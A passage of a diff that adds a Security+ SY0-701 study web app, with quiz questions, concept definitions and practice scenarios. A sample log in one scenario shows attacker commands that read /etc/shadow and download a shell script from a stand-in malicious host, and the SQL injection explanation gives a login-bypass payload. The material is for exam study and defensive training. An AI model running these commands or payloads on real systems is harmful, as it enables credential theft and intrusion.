@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <meta name="theme-color" content="#080c14" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+  <meta name="apple-mobile-web-app-title" content="SEC+ Study" />
+  <title>SEC+ SY0-701 Study</title>
+  <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+  <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+    body { background: #080c14; overscroll-behavior: none; }
+    select { -webkit-appearance: none; appearance: none; }
+    ::-webkit-scrollbar { width: 0; }
+  </style>
+</head>
+<body>
+  <div id="root"></div>
+
+<script type="text/babel">
+const { useState, useRef, useEffect } = React;
+
+/* ═══════════════════════════════════════════════
+   TOKENS
+═══════════════════════════════════════════════ */
+const C = {
+  bg:"#080c14", panel:"#0d1220", border:"#1a2236",
+  accent:"#38bdf8", green:"#4ade80", red:"#f87171",
+  yellow:"#fbbf24", purple:"#c084fc", muted:"#64748b",
+  text:"#cbd5e1", bright:"#f1f5f9",
+};
+const mono = { fontFamily:"'Courier New', monospace" };
+const btn = (color=C.accent, disabled=false) => ({
+  background: disabled?"#1a2236":`${color}18`,
+  border:`1px solid ${disabled?"#1a2236":color+"66"}`,
+  color: disabled?C.muted:color,
+  borderRadius:5, padding:"8px 14px", fontSize:11,
+  fontFamily:"'Courier New', monospace", cursor:disabled?"default":"pointer",
+  fontWeight:700, letterSpacing:"0.06em",
+});
+const panel = { background:C.panel, border:`1px solid ${C.border}`, borderRadius:8, padding:14 };
+const tag = (color) => ({
+  background:`${color}18`, color, border:`1px solid ${color}44`,
+  borderRadius:3, padding:"2px 7px", fontSize:10, fontWeight:700,
+  fontFamily:"'Courier New', monospace",
+});
+
+/* ═══════════════════════════════════════════════
+   STUDY APP DATA
+═══════════════════════════════════════════════ */
+const DOMAINS = [
+  { id:1, name:"General Security Concepts",         weight:12, color:"#00f5c4", icon:"🔐", topics:["CIA Triad","Cryptography","Authentication","Security controls","PKI","Hashing"] },
+  { id:2, name:"Threats, Vulnerabilities & Mitig.", weight:22, color:"#ff6b6b", icon:"⚠️", topics:["Malware","Social engineering","Injection","Threat intel","Vuln scanning","Zero-day"] },
+  { id:3, name:"Security Architecture",             weight:18, color:"#ffd93d", icon:"🏗️", topics:["Segmentation","Cloud security","Zero trust","Firewalls","VPN","DMZ"] },
+  { id:4, name:"Security Operations",               weight:28, color:"#a78bfa", icon:"⚙️", topics:["Incident response","SIEM","IAM","Endpoint","Log analysis","Forensics"] },
+  { id:5, name:"Security Program Management",       weight:20, color:"#fb923c", icon:"📋", topics:["Risk","Compliance","Governance","BCP/DR","Privacy","Awareness"] },
+];
+
+const STUDY_PLAN = [
+  { week:1, focus:"General Security Concepts",         tasks:["Study CIA Triad, AAA, and access controls","Learn cryptography fundamentals (symmetric vs asymmetric)","Understand PKI and certificate management","Practice 20 quiz questions"] },
+  { week:2, focus:"Threats, Vulnerabilities & Mitig.", tasks:["Memorize malware types and behaviors","Study social engineering attack vectors","Learn OWASP Top 10 vulnerabilities","Practice 30 quiz questions (highest weight domain)"] },
+  { week:3, focus:"Security Architecture",             tasks:["Study network design and segmentation","Learn cloud security models (IaaS/PaaS/SaaS)","Understand Zero Trust architecture","Practice 25 quiz questions"] },
+  { week:4, focus:"Security Operations",               tasks:["Study incident response lifecycle (PICERL)","Learn SIEM, SOAR, and log management","Understand IAM and privilege management","Practice 35 quiz questions (highest weight domain)"] },
+  { week:5, focus:"Security Program Management",       tasks:["Study risk management frameworks (NIST, ISO)","Learn compliance regulations (HIPAA, GDPR, PCI-DSS)","Understand BCP and DRP concepts","Practice 25 quiz questions"] },
+  { week:6, focus:"Full Exam Review",                  tasks:["Take 2 full practice exams (90 questions each)","Review all flagged/wrong answers","Focus on performance-based questions (PBQs)","Rest before exam day 🎯"] },
+];
+
+const CONCEPTS = {
+  1:[
+    { term:"CIA Triad",           def:"Confidentiality (only authorized access), Integrity (data not tampered), Availability (systems accessible). Foundation of all security decisions." },
+    { term:"AAA Framework",       def:"Authentication (who are you?), Authorization (what can you do?), Accounting (what did you do?). Core of access control systems." },
+    { term:"Symmetric Encryption",def:"Same key encrypts and decrypts. Fast, used for bulk data. Examples: AES, 3DES. Key distribution is the main challenge." },
+    { term:"Asymmetric Encryption",def:"Public key encrypts, private key decrypts. Slower, used for key exchange and digital signatures. Examples: RSA, ECC." },
+    { term:"Hashing",             def:"One-way function producing a fixed-length digest. Used for integrity verification. Examples: SHA-256, MD5 (deprecated). Salting prevents rainbow table attacks." },
+    { term:"MFA",                 def:"Multi-Factor Authentication: 2+ factors — something you know (password), something you have (token), something you are (biometric)." },
+    { term:"PKI",                 def:"Public Key Infrastructure: framework for managing digital certificates. Includes CAs, RAs, certificate stores, CRL/OCSP for revocation." },
+    { term:"Defense in Depth",    def:"Layered security strategy — if one control fails, others remain. Never rely on a single protection mechanism." },
+  ],
+  2:[
+    { term:"Ransomware",          def:"Encrypts victim's files and demands payment for the decryption key. Prevention: backups, email filtering, endpoint protection." },
+    { term:"Phishing vs Spear",   def:"Phishing = mass generic emails. Spear phishing = targeted, personalized. Whaling = targets executives. Vishing = voice/phone." },
+    { term:"SQL Injection",       def:"Attacker inserts malicious SQL into input fields to manipulate the database. Prevention: parameterized queries, input validation." },
+    { term:"MITM Attack",         def:"Man-in-the-Middle: attacker intercepts communication between two parties. Prevent with encryption & MFA." },
+    { term:"Zero-Day",            def:"Vulnerability unknown to the vendor with no available patch. Mitigated through defense-in-depth and threat intelligence." },
+    { term:"APT",                 def:"Advanced Persistent Threat: sophisticated, long-term attack (often nation-state). Goal: stealth and sustained access." },
+    { term:"Buffer Overflow",     def:"Writing data beyond a buffer's boundary, potentially executing arbitrary code. Prevented by input validation and ASLR." },
+    { term:"Threat Intelligence", def:"Evidence-based knowledge about threats. Types: strategic, tactical (TTPs), operational (specific attacks), technical (IOCs)." },
+  ],
+  3:[
+    { term:"DMZ",             def:"Demilitarized Zone: network segment between internal network and internet. Hosts public-facing services isolated from internal systems." },
+    { term:"Zero Trust",      def:"'Never trust, always verify.' No implicit trust based on network location. Requires continuous authentication and least privilege." },
+    { term:"VLAN",            def:"Virtual LAN: logically segments a network without physical separation. Reduces broadcast domains and improves security." },
+    { term:"Cloud Models",    def:"IaaS (you manage OS+), PaaS (you manage app), SaaS (vendor manages all). Shared responsibility model applies to each." },
+    { term:"Firewall Types",  def:"Packet filtering (L3-4), Stateful (tracks connections), Application/proxy (L7), NGFW (deep packet inspection + IDS/IPS)." },
+    { term:"Micro-segmentation",def:"Fine-grained network segmentation in cloud/VMs. Limits lateral movement by isolating individual workloads." },
+    { term:"VPN Types",       def:"Site-to-site: connects networks. Remote access: individuals. SSL/TLS VPN: browser-based. IPSec: tunnel or transport mode." },
+    { term:"SD-WAN",          def:"Software-Defined WAN: uses software to manage WAN connections. Improves flexibility and can integrate security features." },
+  ],
+  4:[
+    { term:"PICERL",           def:"Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned. Memorize this IR order for the exam." },
+    { term:"SIEM",             def:"Security Information & Event Management: aggregates and correlates logs from multiple sources for real-time threat detection." },
+    { term:"Chain of Custody", def:"Documentation of evidence handling in forensics. Ensures evidence is admissible in court by proving it wasn't tampered with." },
+    { term:"Least Privilege",  def:"Users/systems get only the minimum access needed. Limits damage from compromised accounts or insider threats." },
+    { term:"PAM",              def:"Privileged Access Management: controls, monitors, and audits access by admins. Includes session recording and just-in-time access." },
+    { term:"EDR",              def:"Endpoint Detection & Response: monitors endpoints for suspicious activity and enables automated response. More advanced than antivirus." },
+    { term:"SOAR",             def:"Security Orchestration, Automation & Response: automates repetitive security tasks and IR workflows. Reduces alert fatigue." },
+    { term:"Digital Forensics",def:"Collecting and preserving digital evidence. Order of volatility: CPU registers → RAM → swap → disk → remote logs." },
+  ],
+  5:[
+    { term:"Risk Formula",    def:"Risk = Threat × Vulnerability × Impact. Options: Accept, Avoid, Transfer (insurance), Mitigate." },
+    { term:"BCP vs DRP",      def:"BCP: keeping business running during a disaster. DRP: restoring IT systems after a disaster." },
+    { term:"RTO vs RPO",      def:"RTO: how long before systems must be restored. RPO: how much data loss is acceptable (backup frequency)." },
+    { term:"GDPR",            def:"EU regulation for personal data. Requires consent, data minimization, breach notification within 72 hours, right to erasure." },
+    { term:"HIPAA",           def:"US law protecting health information. PHI must be secured with administrative, physical, and technical safeguards." },
+    { term:"PCI-DSS",         def:"Payment Card Industry standard for protecting cardholder data. 12 requirements covering network security, encryption, access control." },
+    { term:"NIST CSF",        def:"NIST Cybersecurity Framework: Identify → Protect → Detect → Respond → Recover. Widely used risk management framework." },
+    { term:"Security Awareness",def:"Training users to recognize threats. Human layer is often the weakest link. Regular training reduces risk significantly." },
+  ],
+};
+
+const QUIZ_QUESTIONS = {
+  1:[
+    { q:"Which encryption type uses the same key for encryption and decryption?", options:["Asymmetric","Symmetric","Hashing","PKI"], answer:1, explanation:"Symmetric encryption (e.g., AES) uses one shared key. It's fast but requires secure key distribution." },
+    { q:"What does the 'I' in CIA Triad stand for?", options:["Identification","Integrity","Infrastructure","Identity"], answer:1, explanation:"Integrity ensures data has not been altered. It's verified using hashing algorithms like SHA-256." },
+    { q:"A user must present a password AND a fingerprint to log in. This is:", options:["SSO","Biometrics","MFA","Federation"], answer:2, explanation:"MFA combines two or more factors: something you know (password) + something you are (fingerprint)." },
+    { q:"Which of the following is a one-way cryptographic function?", options:["AES","RSA","SHA-256","DES"], answer:2, explanation:"SHA-256 is a hashing algorithm. Hashing is one-way — you can't reverse it to get the original data." },
+    { q:"What component of PKI is responsible for issuing digital certificates?", options:["RA","CRL","CA","OCSP"], answer:2, explanation:"Certificate Authority (CA) issues and signs digital certificates. RA handles registration, CRL/OCSP handle revocation." },
+  ],
+  2:[
+    { q:"Personalized emails targeting a company's CFO is called:", options:["Phishing","Vishing","Whaling","Smishing"], answer:2, explanation:"Whaling is spear phishing targeting high-level executives. Vishing = voice calls, Smishing = SMS." },
+    { q:"Which attack inserts malicious code into a web form to manipulate a database?", options:["XSS","SQL Injection","Buffer Overflow","CSRF"], answer:1, explanation:"SQL Injection inserts SQL commands into input fields. Prevented by parameterized queries and input validation." },
+    { q:"A vulnerability unknown to the vendor with no available patch is called a:", options:["Logic bomb","Zero-day","Rootkit","Backdoor"], answer:1, explanation:"A zero-day exploit targets an unpatched vulnerability. The vendor has 'zero days' to fix it." },
+    { q:"Which malware type encrypts files and demands payment?", options:["Worm","Trojan","Ransomware","Spyware"], answer:2, explanation:"Ransomware encrypts victim data and demands a ransom. Backups are the best defense." },
+    { q:"An attacker intercepts traffic between a user and a web server. This is:", options:["DoS attack","Replay attack","MITM attack","Smurf attack"], answer:2, explanation:"Man-in-the-Middle (MITM) attacks intercept communications. Encryption (TLS) and certificate pinning help prevent them." },
+  ],
+  3:[
+    { q:"Which network zone hosts public-facing servers while protecting the internal network?", options:["Intranet","VLAN","DMZ","Extranet"], answer:2, explanation:"A DMZ sits between the internet and internal network, hosting web and email servers." },
+    { q:"'Never trust, always verify' describes which architecture?", options:["Defense in Depth","Zero Trust","DMZ","Microsegmentation"], answer:1, explanation:"Zero Trust assumes no implicit trust based on network location. Every request must be authenticated." },
+    { q:"Which cloud model gives the customer the LEAST control over infrastructure?", options:["IaaS","PaaS","SaaS","On-premises"], answer:2, explanation:"In SaaS, the vendor manages everything. Customers only manage their data and user settings." },
+    { q:"A firewall that inspects packets at Layer 7 is called a:", options:["Packet filter","Stateful firewall","NGFW","ACL"], answer:2, explanation:"Next-Generation Firewall (NGFW) performs deep packet inspection at Layer 7, including app awareness and IDS/IPS." },
+    { q:"Which VPN protocol is most secure for site-to-site connections?", options:["PPTP","L2TP","IPSec","SOCKS5"], answer:2, explanation:"IPSec provides strong encryption, authentication, and integrity. PPTP is considered obsolete and insecure." },
+  ],
+  4:[
+    { q:"The correct order of the incident response lifecycle is:", options:["Identification, Preparation, Containment, Eradication, Recovery, Lessons Learned","Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned","Containment, Identification, Preparation, Recovery, Eradication, Lessons Learned","Preparation, Containment, Identification, Eradication, Recovery, Lessons Learned"], answer:1, explanation:"PICERL: Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned." },
+    { q:"Which tool aggregates and correlates logs from multiple sources for threat detection?", options:["EDR","SOAR","SIEM","WAF"], answer:2, explanation:"SIEM centralizes log collection and correlates events to detect threats and support compliance." },
+    { q:"In digital forensics, which data source is MOST volatile?", options:["Hard disk","Swap space","RAM","CPU registers"], answer:3, explanation:"CPU registers are the most volatile. Order: CPU registers → RAM → swap → disk → remote logs." },
+    { q:"A user account with only minimum required permissions follows which principle?", options:["Need to know","Separation of duties","Least privilege","Defense in depth"], answer:2, explanation:"Least privilege limits accounts to minimum permissions required. Reduces damage from compromised accounts." },
+    { q:"Which technology records privileged user sessions and provides just-in-time access?", options:["SIEM","EDR","PAM","DLP"], answer:2, explanation:"Privileged Access Management (PAM) controls admin access, records sessions, and can provide time-limited privileges." },
+  ],
+  5:[
+    { q:"Purchasing cyber liability insurance is an example of risk:", options:["Avoidance","Mitigation","Acceptance","Transference"], answer:3, explanation:"Risk transference shifts the financial impact to another party. It doesn't eliminate the risk." },
+    { q:"RTO refers to:", options:["Maximum acceptable data loss","How long systems can be down before recovery must occur","Cost of recovering from an incident","Frequency of data backups"], answer:1, explanation:"Recovery Time Objective (RTO) = how long systems can be offline. RPO = acceptable data loss." },
+    { q:"Which regulation requires breach notification within 72 hours and grants right to erasure?", options:["HIPAA","PCI-DSS","GDPR","SOX"], answer:2, explanation:"GDPR requires 72-hour breach notification and gives individuals rights including data erasure." },
+    { q:"The NIST Cybersecurity Framework's five core functions in order are:", options:["Protect, Identify, Detect, Respond, Recover","Identify, Protect, Detect, Respond, Recover","Identify, Detect, Protect, Respond, Recover","Prepare, Identify, Contain, Eradicate, Recover"], answer:1, explanation:"NIST CSF: Identify → Protect → Detect → Respond → Recover." },
+    { q:"Which document outlines procedures for restoring IT systems after a disaster?", options:["BCP","DRP","SLA","AUP"], answer:1, explanation:"Disaster Recovery Plan (DRP) focuses on restoring IT systems. BCP is broader — keeping the whole business operational." },
+  ],
+};
+
+/* ═══════════════════════════════════════════════
+   PBQ DATA
+═══════════════════════════════════════════════ */
+const PBQS = [
+  {
+    id:0, type:"Log Analysis", domain:"Security Operations", difficulty:"Medium",
+    scenario:"A SOC analyst is reviewing the following authentication log from a web server. Analyze the entries and answer the questions below.",
+    log:`2024-03-15 02:11:03 AUTH FAIL user=admin src=185.220.101.42 attempt=1
+2024-03-15 02:11:05 AUTH FAIL user=admin src=185.220.101.42 attempt=2
+2024-03-15 02:11:07 AUTH FAIL user=admin src=185.220.101.42 attempt=3
+2024-03-15 02:11:09 AUTH FAIL user=root  src=185.220.101.42 attempt=1
+2024-03-15 02:11:11 AUTH FAIL user=root  src=185.220.101.42 attempt=2
+2024-03-15 02:11:13 AUTH FAIL user=test  src=185.220.101.42 attempt=1
+2024-03-15 02:11:15 AUTH FAIL user=test  src=185.220.101.42 attempt=2
+2024-03-15 02:11:17 AUTH OK   user=admin src=185.220.101.42 attempt=4
+2024-03-15 02:11:19 CMD       user=admin cmd="cat /etc/shadow" src=185.220.101.42
+2024-03-15 02:11:22 CMD       user=admin cmd="wget http://evil.ru/shell.sh" src=185.220.101.42`,
+    questions:[
+      { q:"What type of attack is shown in the log?", options:["Phishing","Brute force / credential stuffing","SQL Injection","Replay attack"], answer:1, hint:"Look at the pattern of repeated AUTH FAIL entries across multiple usernames from a single IP." },
+      { q:"What happened at 02:11:19?", options:["A new user was created","Credential dumping was attempted","A DoS attack began","A port scan was initiated"], answer:1, hint:"/etc/shadow contains hashed passwords — reading it is a classic post-exploitation credential dump." },
+      { q:"Which IMMEDIATE action should the analyst take?", options:["Reset the admin password only","Block the source IP and isolate the host","Delete the /etc/shadow file","Reboot the server"], answer:1, hint:"The attacker is already inside and running commands. Containment first." },
+    ],
+  },
+  {
+    id:1, type:"Drag & Drop", domain:"Security Operations", difficulty:"Easy",
+    scenario:"A ransomware infection has been detected on a workstation. Drag the incident response steps into the correct order (PICERL framework).",
+    items:[
+      "Identify infected systems and scope of compromise",
+      "Restore systems from clean backups",
+      "Prepare IR playbooks and tools in advance",
+      "Remove malware, close attack vectors",
+      "Document lessons learned and update defenses",
+      "Isolate infected host from the network",
+    ],
+    correctOrder:[2,0,5,3,1,4],
+    labels:["Preparation","Identification","Containment","Eradication","Recovery","Lessons Learned"],
+  },
+  {
+    id:2, type:"Firewall Config", domain:"Security Architecture", difficulty:"Hard",
+    scenario:"Configure firewall rules for a network with Internal LAN (10.0.1.0/24), a DMZ hosting a web server (10.0.2.10), and the Internet. Match each requirement to the correct rule.",
+    requirements:[
+      { req:"Allow external users to reach the web server on HTTPS",       correct:"PERMIT ANY → 10.0.2.10 TCP 443" },
+      { req:"Block all direct internet access to the internal LAN",        correct:"DENY ANY → 10.0.1.0/24" },
+      { req:"Allow internal users to browse the internet",                 correct:"PERMIT 10.0.1.0/24 → ANY TCP 80,443" },
+      { req:"Allow web server to query internal DB on port 3306",          correct:"PERMIT 10.0.2.10 → 10.0.1.0/24 TCP 3306" },
+    ],
+    ruleOptions:[
+      "PERMIT ANY → 10.0.2.10 TCP 443","PERMIT ANY → 10.0.1.0/24 TCP 443",
+      "DENY ANY → 10.0.1.0/24","DENY ANY → 10.0.2.10",
+      "PERMIT 10.0.1.0/24 → ANY TCP 80,443","PERMIT 10.0.1.0/24 → ANY TCP 22",
+      "PERMIT 10.0.2.10 → 10.0.1.0/24 TCP 3306","PERMIT ANY → 10.0.1.0/24 TCP 3306",
+    ],
+  },
+  {
+    id:3, type:"Network Placement", domain:"Security Architecture", difficulty:"Medium",
+    scenario:"Place each security device in the correct network zone: Internet Edge, DMZ, or Internal Network.",
+    devices:[
+      { name:"WAF (Web App Firewall)",  correct:"DMZ",              icon:"🛡️" },
+      { name:"IDS Sensor",             correct:"Internal Network",  icon:"🔍" },
+      { name:"Perimeter Firewall",     correct:"Internet Edge",     icon:"🔥" },
+      { name:"SIEM",                   correct:"Internal Network",  icon:"📊" },
+      { name:"Reverse Proxy",          correct:"DMZ",              icon:"🔄" },
+      { name:"VPN Concentrator",       correct:"Internet Edge",     icon:"🔒" },
+    ],
+    zones:["Internet Edge","DMZ","Internal Network"],
+  },
+  {
+    id:4, type:"Command Line", domain:"Threats & Vulnerabilities", difficulty:"Medium",
+    scenario:"A forensic analyst needs to perform several tasks on a compromised Linux system. Select the correct command for each task.",
+    tasks:[
+      { task:"Display all active network connections and listening ports", options:["netstat -an","ifconfig -a","route -n","arp -a"], answer:0, hint:"netstat -an shows all connections (-a) in numeric form (-n). Essential for spotting suspicious connections." },
+      { task:"List all running processes including their PIDs",            options:["ls -la /proc","ps aux","top -b","kill -l"],         answer:1, hint:"ps aux shows ALL processes (a=all users, u=user format, x=without terminal). Used in forensics." },
+      { task:"Check recently modified files in /tmp (possible malware)",  options:["find /tmp -mtime -1 -ls","cat /tmp/*","chmod 777 /tmp","diff /tmp /var"], answer:0, hint:"find with -mtime -1 finds files modified in the last day. /tmp is a common attacker staging area." },
+      { task:"View the last 20 lines of the auth log",                    options:["grep auth /var/log","head -20 /var/log/auth.log","tail -20 /var/log/auth.log","cat /var/log/auth.log | less"], answer:2, hint:"tail shows the END of a file — where the most recent events are. head shows the beginning." },
+    ],
+  },
+  {
+    id:5, type:"Match Terms", domain:"General Security Concepts", difficulty:"Easy",
+    scenario:"Match each cryptographic algorithm or concept to its correct use case or characteristic.",
+    pairs:[
+      { term:"AES-256",         match:"Encrypting data at rest (symmetric, bulk encryption)" },
+      { term:"RSA-2048",        match:"Encrypting a session key during TLS handshake (asymmetric)" },
+      { term:"SHA-256",         match:"Verifying file integrity (one-way hash, no key)" },
+      { term:"HMAC",            match:"Message authentication with a shared secret key" },
+      { term:"Diffie-Hellman",  match:"Secure key exchange over an untrusted channel" },
+      { term:"ECC",             match:"Asymmetric encryption with smaller key sizes, used in mobile/IoT" },
+    ],
+  },
+];
+
+/* ═══════════════════════════════════════════════
+   SHARED COMPONENTS
+═══════════════════════════════════════════════ */
+function Badge({ text, color }) {
+  return <span style={tag(color)}>{text}</span>;
+}
+
+/* ═══════════════════════════════════════════════
+   STUDY APP COMPONENTS
+═══════════════════════════════════════════════ */
+function StudyApp() {
+  const MODES = ["Quiz","Concepts","Study Plan"];
+  const [mode, setMode]         = useState("Quiz");
+  const [selDomain, setSelDomain]   = useState(null);
+  const [quizState, setQuizState]   = useState({ qi:0, selected:null, showAnswer:false, score:0, finished:false });
+  const [progress, setProgress]     = useState({1:0,2:0,3:0,4:0,5:0});
+  const [conceptPage, setConceptPage] = useState(0);
+  const [aiText, setAiText] = useState("");
+
+  const questions = selDomain ? QUIZ_QUESTIONS[selDomain] : [];
+  const concepts  = selDomain ? CONCEPTS[selDomain] : [];
+  const domain    = selDomain ? DOMAINS.find(d=>d.id===selDomain) : null;
+  const totalPct  = Math.round(Object.values(progress).reduce((a,b)=>a+b,0)/5);
+
+  const startQuiz = (id) => {
+    setSelDomain(id);
+    setQuizState({ qi:0, selected:null, showAnswer:false, score:0, finished:false });
+  };
+
+  const handleAnswer = (idx) => {
+    if (quizState.showAnswer) return;
+    setQuizState(s=>({...s, selected:idx, showAnswer:true}));
+  };
+
+  const nextQ = () => {
+    const correct = quizState.selected === questions[quizState.qi].answer;
+    const newScore = quizState.score + (correct?1:0);
+    if (quizState.qi+1 >= questions.length) {
+      setProgress(p=>({...p,[selDomain]:Math.round((newScore/questions.length)*100)}));
+      setQuizState(s=>({...s, score:newScore, finished:true}));
+    } else {
+      setQuizState(s=>({...s, qi:s.qi+1, selected:null, showAnswer:false, score:newScore}));
+    }
+  };
+
+  const DEEP_EXPLAIN = {
+    "CIA Triad": "The CIA Triad is the backbone of every security decision you'll make. Confidentiality means only authorized people can access data — enforced through encryption, access controls, and MFA. Integrity means data hasn't been altered — enforced through hashing (SHA-256) and digital signatures. Availability means systems are up when needed — protected by redundancy, backups, and DDoS mitigation.\n\nAnalogy: A bank vault. Only the right people have the combination (Confidentiality), the money inside isn't counterfeit (Integrity), and the bank is open during business hours (Availability).\n\n🎯 EXAM TIP: When a question asks which CIA principle is violated, look for the keyword: unauthorized access = Confidentiality, data modified = Integrity, system down = Availability. Ransomware violates ALL THREE.",
+    "AAA Framework": "AAA stands for Authentication, Authorization, and Accounting — three distinct steps that together control access to systems.\n\nAuthentication: Proving who you are (username + password, MFA, biometrics). Authorization: What you're allowed to do once authenticated (read-only vs admin). Accounting: Logging what you actually did (audit trails, SIEM logs).\n\nAnalogy: A hotel. You check in and show ID (Authentication), get a key card that only opens your room (Authorization), and the hotel tracks when you enter/exit (Accounting).\n\nCommon protocols: RADIUS and TACACS+ implement AAA for network access.\n\n🎯 EXAM TIP: Don't confuse Authentication with Authorization. Authentication = identity. Authorization = permissions. They're tested as separate concepts. TACACS+ encrypts the entire packet; RADIUS only encrypts the password.",
+    "Symmetric Encryption": "Symmetric encryption uses the SAME key to both encrypt and decrypt data. It's extremely fast, making it ideal for encrypting large amounts of data at rest or in transit.\n\nKey algorithms to know: AES (Advanced Encryption Standard) — the gold standard, used in 128, 192, and 256-bit key lengths. 3DES — older, being phased out. DES — broken, not used.\n\nThe big weakness: key distribution. If you want to share encrypted data with someone, you must securely share the key first — which is a chicken-and-egg problem.\n\nAnalogy: A physical lockbox where both sender and receiver have identical copies of the same key.\n\n🎯 EXAM TIP: AES-256 = symmetric = fast = bulk data encryption. If a question mentions speed or large data volumes, think symmetric. Key exchange problems → asymmetric solves this.",
+    "Asymmetric Encryption": "Asymmetric encryption uses a KEY PAIR: a public key (shared freely) and a private key (kept secret). Data encrypted with the public key can ONLY be decrypted with the matching private key.\n\nUse cases: TLS/HTTPS handshakes, digital signatures, email encryption (PGP), SSH key authentication.\n\nKey algorithms: RSA (most common), ECC (elliptic curve — smaller keys, same security, better for mobile), Diffie-Hellman (key exchange only, not encryption).\n\nAnalogy: A mailbox slot. Anyone can drop mail in (encrypt with public key), but only the owner with the key can open the box (decrypt with private key).\n\n🎯 EXAM TIP: Asymmetric is SLOW — never used for bulk data. It's used to securely exchange a symmetric key, which then encrypts the actual data. This hybrid approach is how TLS works.",
+    "Hashing": "Hashing takes any input and produces a fixed-length output called a digest or hash. It is ONE-WAY — you cannot reverse a hash to get the original data. The same input ALWAYS produces the same hash (deterministic).\n\nKey algorithms: SHA-256 and SHA-3 (secure), MD5 (broken — only use for checksums, never security). A tiny change in input produces a completely different hash — this is called the avalanche effect.\n\nSalting: Adding a random value before hashing to prevent rainbow table attacks. Password databases should always store salted hashes.\n\nAnalogy: A meat grinder. You can put a steak in and get ground beef out — but you cannot reconstruct the steak from the ground beef.\n\n🎯 EXAM TIP: Hashing = integrity verification. If a question asks how to verify a file wasn't tampered with, the answer is hashing. MD5 = weak. SHA-256 = strong.",
+    "MFA": "Multi-Factor Authentication requires TWO OR MORE factors from different categories: Something you KNOW (password, PIN, security question), Something you HAVE (authenticator app, hardware token, smart card), Something you ARE (fingerprint, retina scan, facial recognition).\n\nTwo-factor authentication (2FA) is the most common implementation. Using two factors from the SAME category (e.g., two passwords) does NOT count as MFA.\n\nTypes of tokens: TOTP (Time-based One-Time Password — Google Authenticator), HOTP (HMAC-based, counter-based), hardware tokens (YubiKey).\n\nAnalogy: An ATM requires your card (something you have) AND your PIN (something you know).\n\n🎯 EXAM TIP: MFA is the single most effective control against credential theft. If a question asks the BEST way to prevent unauthorized access after a password breach, the answer is MFA.",
+    "PKI": "Public Key Infrastructure is the system of hardware, software, policies, and procedures used to create, manage, distribute, and revoke digital certificates.\n\nKey components: CA (Certificate Authority) — issues and signs certificates. RA (Registration Authority) — handles enrollment requests. CRL (Certificate Revocation List) — list of revoked certs. OCSP (Online Certificate Status Protocol) — real-time revocation checking. Certificate Store — where trusted root CAs are stored on your device.\n\nA certificate binds a public key to an identity (like a website domain), and is signed by a trusted CA.\n\nAnalogy: A government ID system. The government (CA) vouches for your identity and issues you a passport (certificate).\n\n🎯 EXAM TIP: Know the difference between CRL (periodic batch list) and OCSP (real-time check). OCSP stapling improves performance. A self-signed certificate has no CA trust chain.",
+    "Defense in Depth": "Defense in Depth is a layered security strategy where multiple independent security controls protect a system. If one layer fails, attackers still face additional barriers.\n\nLayers typically include: Perimeter (firewall, IDS/IPS), Network (VLANs, segmentation), Host (endpoint protection, OS hardening), Application (input validation, WAF), Data (encryption, DLP), and Human (security awareness training).\n\nNo single control is 100% effective. Defense in depth assumes breach and prepares accordingly.\n\nAnalogy: A medieval castle — moat (perimeter), drawbridge (access control), walls (network), guards (monitoring), and a keep (data protection). Multiple independent barriers.\n\n🎯 EXAM TIP: When a question asks for the security ARCHITECTURE principle behind using multiple overlapping controls, the answer is Defense in Depth (also called layered security). It's the opposite of security through obscurity.",
+    "Ransomware": "Ransomware is malware that encrypts the victim's files using strong asymmetric encryption, then demands payment (usually cryptocurrency) for the decryption key. Modern ransomware often also exfiltrates data and threatens to publish it (double extortion).\n\nCommon delivery: Phishing emails, RDP exploits, malicious downloads. Famous examples: WannaCry (2017), REvil, LockBit.\n\nDefense: Regular offline backups (most effective), email filtering, endpoint protection, network segmentation (limits spread), patch management (closes exploit entry points), least privilege (limits damage).\n\nAnalogy: Someone breaks into your house, changes all the locks, and demands money for the new keys — while threatening to share your documents publicly.\n\n🎯 EXAM TIP: The BEST defense against ransomware is immutable offline backups — paying the ransom is never recommended. Ransomware violates all three CIA principles: Confidentiality (exfiltration), Integrity (encryption), Availability (files inaccessible).",
+    "Phishing vs Spear": "Phishing is a broad category of social engineering attacks using deceptive electronic communications to steal credentials or deliver malware.\n\nPhishing: Mass emails sent to thousands, generic lure (e.g., 'Your account is locked'). Spear Phishing: Targeted, personalized — attacker researches the victim beforehand. Whaling: Spear phishing targeting executives (CEO, CFO). Vishing: Voice/phone-based phishing. Smishing: SMS-based phishing. Pharming: Redirects users to fake websites via DNS poisoning.\n\nIndicators: Urgency/fear tactics, mismatched URLs, unexpected attachments, requests for credentials.\n\nDefense: Security awareness training, email filtering (SPF, DKIM, DMARC), MFA.\n\n🎯 EXAM TIP: Memorize the naming convention. Whaling = executives. Vishing = voice. Smishing = SMS. Pharming = DNS manipulation. Spear phishing uses OSINT to personalize attacks — LinkedIn is a goldmine for attackers.",
+    "SQL Injection": "SQL Injection (SQLi) is an attack where malicious SQL code is inserted into an input field that is then executed by the backend database. It can result in unauthorized data access, data modification, authentication bypass, or complete database takeover.\n\nExample: Entering ' OR '1'='1 into a login form to bypass authentication.\n\nTypes: Classic (in-band), Blind (boolean/time-based — no direct output), Out-of-band.\n\nPrevention: Parameterized queries / prepared statements (most effective), stored procedures, input validation, WAF, least privilege on DB accounts.\n\nAnalogy: A restaurant where instead of saying your order, you write a fake 'manager's note' that changes the whole menu.\n\n🎯 EXAM TIP: The definitive fix for SQL injection is parameterized queries — not just input filtering. Input validation is defense-in-depth but not sufficient alone. SQLi is an injection attack, which tops the OWASP list.",
